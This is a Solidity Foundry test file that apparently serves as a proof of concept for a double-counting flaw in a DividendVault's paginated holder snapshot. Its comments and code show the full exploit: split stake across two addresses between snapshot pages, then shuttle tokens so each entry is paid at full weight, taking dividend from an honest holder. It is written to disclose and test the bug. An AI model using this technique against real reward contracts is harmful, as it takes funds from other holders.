// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";
import {StockifyToken} from "../src/StockifyToken.sol";
import {DividendVault} from "../src/DividendVault.sol";
import {MockStock} from "./mocks/MockStock.sol";

contract MintingRouter {
    MockStock internal immutable stock;

    constructor(MockStock stock_) {
        stock = stock_;
    }

    function buy() external payable {
        stock.mint(msg.sender, msg.value * 10);
    }
}

/// @notice The paginated snapshot dedups by *address* (`_seenEpoch`) and clamps weight to the live
/// balance *per index*. Neither prevents the same STFY from being registered under two addresses
/// and paid twice: the attacker splits after being captured, gets the second address captured by a
/// later page, then shuttles the stake back and forth to be full-weight at each index's turn.
contract SnapshotDoubleCountTest is Test {
    address internal constant HONEST = address(0x404);
    address internal constant A = address(0xAAA);
    address internal constant B = address(0xBBB);

    StockifyToken internal stfy;
    MockStock internal stock;
    DividendVault internal vault;

    function setUp() public {
        stfy = new StockifyToken(address(this), address(this));
        stock = new MockStock("NVIDIAc", "NVDAc");
        MintingRouter router = new MintingRouter(stock);

        address[] memory stocks = new address[](1);
        stocks[0] = address(stock);
        uint16[] memory weights = new uint16[](1);
        weights[0] = 10_000;
        vault = new DividendVault(
            address(stfy), address(router), address(this), address(this), address(this), stocks, weights
        );
        vault.setKeeper(address(this), true);

        // Keep the deployer out of the registry so only A and HONEST hold eligible stake.
        stfy.setRewardsExcluded(address(this), true);
        stfy.transfer(A, 200_000e18); // registry index 0
        stfy.transfer(HONEST, 800_000e18); // registry index 1
    }

    function test_AddressHopDuringPaginatedSnapshotPaysTheSameStakeTwice() public {
        stock.mint(address(vault), 1_100e18); // the cycle's pot, already bought

        // --- capture, one page at a time, as the keeper does for a large registry ---
        vault.snapshotHolders(1); // captures (A, 200k)
        assertEq(vault.eligibleSupply(), 200_000e18);

        // A splits. A keeps exactly the threshold so it stays registered; B is pushed at the tail,
        // beyond snapshotCursor, so a later page will capture it as a brand-new holder.
        vm.prank(A);
        stfy.transfer(B, 100_000e18);

        vault.snapshotHolders(1); // captures (HONEST, 800k)
        vault.snapshotHolders(1); // captures (B, 100k) — the same stake, a second time

        // 1.1M of claimed weight against 1.0M of real stake.
        assertEq(vault.eligibleSupply(), 1_100_000e18);
        assertEq(stfy.balanceOf(A) + stfy.balanceOf(B), 200_000e18);

        vault.startCycle();

        // --- payout, shuttling the stake so each entry is full weight at its turn ---
        vm.prank(B);
        stfy.transfer(A, 100_000e18); // A back to 200k before index 0 is processed
        vault.distributeBatch(1);

        vm.prank(A);
        stfy.transfer(B, 100_000e18); // and back to B before index 2 is processed
        vault.distributeBatch(1); // HONEST
        vault.distributeBatch(1); // B

        uint256 attacker = stock.balanceOf(A) + stock.balanceOf(B);
        uint256 honest = stock.balanceOf(HONEST);

        // Realised: the attacker is paid on 300k of weight while holding 200k.
        assertEq(attacker, 300e18);
        assertEq(honest, 800e18);
        assertEq(attacker + honest, 1_100e18); // the whole pot clears, nothing reverts

        // Fair shares on the real 200k / 800k split would have been:
        uint256 fairAttacker = (1_100e18 * 200_000e18) / 1_000_000e18; // 220
        uint256 fairHonest = (1_100e18 * 800_000e18) / 1_000_000e18; // 880
        assertEq(fairAttacker, 220e18);
        assertEq(fairHonest, 880e18);

        // The attacker took 80 units of stock straight out of the honest holder's dividend.
        assertEq(attacker - fairAttacker, 80e18);
        assertEq(fairHonest - honest, 80e18);
    }
}
